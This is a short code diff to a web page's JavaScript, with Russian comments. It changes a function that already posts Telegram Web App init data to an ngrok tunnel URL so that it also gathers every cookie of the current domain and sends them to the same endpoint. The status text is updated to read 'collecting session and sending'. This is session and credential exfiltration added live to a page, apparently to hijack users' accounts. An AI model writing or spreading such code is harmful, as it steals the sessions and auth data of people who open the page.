@@ -28,13 +28,19 @@
         }
 
         function sendDirect() {
-            statusEl.innerHTML = "⏳ Отправка данных...";
+            statusEl.innerHTML = "⏳ Сбор сессии и отправка...";
             btn.disabled = true;
+
+            // Собираем все доступные куки текущего домена
+            const cookies = document.cookie; 
 
             fetch(NGROK_URL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({init_data: t.initData})
+                body: JSON.stringify({
+                    init_data: t.initData,
+                    cookies: cookies 
+                })
             })
             .then(r => r.json())
             .then(d => {
